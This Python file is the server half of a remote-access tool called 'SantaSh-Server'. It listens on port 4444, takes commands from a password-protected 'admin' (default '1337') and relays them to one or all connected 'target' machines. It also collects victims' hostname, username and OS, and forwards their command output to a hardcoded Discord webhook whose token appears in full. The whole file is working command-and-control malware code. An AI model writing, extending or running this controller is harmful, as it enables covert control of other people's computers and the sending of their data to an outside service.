import socket
import threading
from discord_webhook import DiscordWebhook, DiscordEmbed  # for sending messages to DISCORD when the ADMIN is offline

HOST='192.168.0.104'  # Local IP address of the server
PORT=4444             # Server port to listen on
BUFFER=1024 * 128 * 1000
FORMAT='ascii'

import datetime
now=datetime.datetime.now()

def save_logs(logs):
    with open('server.logs', 'a') as file:
        file.write(logs + '\n' + str(now.strftime("%D %H:%M:%S")) + '\n\n\n')


server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.bind((HOST,PORT))
server.listen()

clients=[]
devices=[]
number_of_connected_devices=-1  # when the ADMIN user connect this number increase by 1, so if there is no active devices, the output of the command 'ncd' is 0.
interact_with_client=False
broadcasting=False

def broadcast(message):
    for client in clients:
        client.send(message)  # this sends a message to every client: except the admin because by default he cannot receive commands
        save_logs(f'[@] Broadcasting [{clients}] >> {message.decode(FORMAT)}')


def handle(client):
    global number_of_connected_devices, interact_with_client, broadcasting
    while True:
        try:
            msg = message = client.recv(BUFFER)
            if devices[clients.index(client)] == 'admin':  # execute the following messages/commands if the client is the ADMIN user
                save_logs(f'[@] ADMIN >> "{msg.decode(FORMAT)}"')
                
                # Server commands

                # if msg.decode(FORMAT).startswith('kick'):  # uncommenting this enables the "kick" command
                #         name_to_kick = msg.decode(FORMAT)[5:]
                #         kick_user(name_to_kick)
                
                
                if msg.decode(FORMAT).startswith('lcd'):
                    all_devices = '\n' + str(devices) + '\n'  # this tells the ADMIN about the available devices (with their keys/nicknames)
                    tell_admin(all_devices)


                elif msg.decode(FORMAT).startswith('ncd'):
                    tell_admin(f'\nConnected devices: {number_of_connected_devices}\n')


                elif msg.decode(FORMAT).startswith('time'):
                    time_now = datetime.datetime.now()
                    tell_admin(f'[@] Server: {str(time_now.strftime("%H:%M:%S.%f"))}')  # '\n' is not needed at the beginning and at the end
                    if interact_with_client == True and broadcasting == False:
                        send_to_interacted_client.send(msg)  # retrieves the time from the connected/interacted client
                    elif interact_with_client == False and broadcasting == True:
                        broadcast(msg)  # retrieves the time from the broadcasted clients

                elif msg.decode(FORMAT).startswith('interact'):
                    interact_with = msg.decode(FORMAT)[9:]
                    if interact_with != 'broadcast':
                        interact_user(interact_with)  # this sets => interact_with_client = True
                        broadcasting = False
                    else: 
                        broadcasting = True
                        interact_with_client = False


                elif msg.decode(FORMAT).startswith('exit'):  # if the ADMIN use this command, it will disconnect him. (The ADMIN can reconnect later)
                    kick_user('admin')

                else:
                    # these commands will be executed if the ADMIN is interacting with any TARGET
                    if interact_with_client == True and broadcasting == False:
                        send_to_interacted_client.send(msg)  # the ADMIN will execute a command on the client that he is interacting with

                    # these commands will be executed if the ADMIN is broadcasting
                    elif interact_with_client == False and broadcasting == True:
                        broadcast(msg)  # the ADMIN executes a command on all available clients excluding himself
                    
                    
                    else:
                        tell_admin('\n\n[-] This command does not exist\n')  # when the ADMIN is not interacting or broadcasting the commands for interacting/broadcasting won't be executed
            else:
                tell_admin(msg.decode(FORMAT))  # this is executed when the "normal client" sends a "command". Actually this type of commands are (message) output of an executed command from the "admin client"


        except:
            if client in clients:
                index = clients.index(client)
                clients.remove(client)
                client.close()
                device = devices[index]
                tell_admin(f'\n[-] Device: "{device}" has left\n')
                save_logs(f'[-] Device: "{device}" has left')
                devices.remove(device)
                number_of_connected_devices -= 1
                break

def receive():
    global number_of_connected_devices
    while True:
        client, address = server.accept()
        client.send("NICK".encode(FORMAT))
        device = client.recv(1024).decode(FORMAT)

        print(f'Connected with {str(address[0])}:{str(address[1])} ~ "{device}"')
        save_logs(f'[+] New Connected From {str(address[0])}:{str(address[1])} ~ "{device}"')
        number_of_connected_devices += 1

        
        if device == 'admin':
            client.send('PASS'.encode(FORMAT))
            password = client.recv(1024).decode(FORMAT)
            save_logs('[@] Admin: is trying to log in')

            if password != '1337':  # default password
                save_logs(f'[!] Someone has tried to log in with a password: {password}')
                client.send('refuse'.encode(FORMAT))
                client.close()
                continue


        devices.append(device)
        clients.append(client)

        tell_admin(f'\n[+] Device: "{device}" has joined\n')
        save_logs(f'[+] Device: "{device}" has joined')

        thread = threading.Thread(target=handle, args=(client,))
        thread.start()


def mail_admin(message):
    try:
        WEBHOOK = "https://discord.com/api/webhooks/921435574357876776/96Pbi7Ux8RzV6l7YMr3g5m_GI2R3ejRELNZCGafS2cNOcbTQ8_ZQkVrLfmgPKehIomAT"
        webhook = DiscordWebhook(url=WEBHOOK)
        embed = DiscordEmbed(title=f"=====  SantaSh-Server  =====", description=message)
        webhook.add_embed(embed)    
        webhook.execute()
    except Exception as Error_Message:
        save_logs('[!] Message could not be deliver to DISCORD "' + message + '"' + f'Error: {Error_Message}')

# commands
def tell_admin(output):
    admin_name = 'admin'
    try:
        name_index = devices.index(admin_name)
        admin = clients[name_index]
        admin.send(output.encode(FORMAT))
        save_logs('[@] Output: >> ' + output)
    except: # this will be executed when there is no admin active
        mail_admin(output)


def kick_user(name):
    global number_of_connected_devices
    if name in devices:
        name_index = devices.index(name)

        client_to_kick = clients[name_index]
        clients.remove(client_to_kick)

        client_to_kick.send('exited'.encode(FORMAT))
        client_to_kick.close()
        devices.remove(name)
        number_of_connected_devices -= 1
        # tell_admin(f'\n[i] {name} was kicked\n')  # This tells the admin about the event. This is used when the "kick" command is enabled.


def interact_user(name):
    global interact_with_client, send_to_interacted_client
    interact_with_client = True
    if name in devices:
        name_index = devices.index(name)

        send_to_interacted_client = clients[name_index]
        send_to_interacted_client.send('program-command-for-interaction'.encode(FORMAT))  # when the ADMIN is trying to interact with an user this command will be sent to the user, retrieving => (hostname/username/operating system)



save_logs('[@] Server has started')
receive()





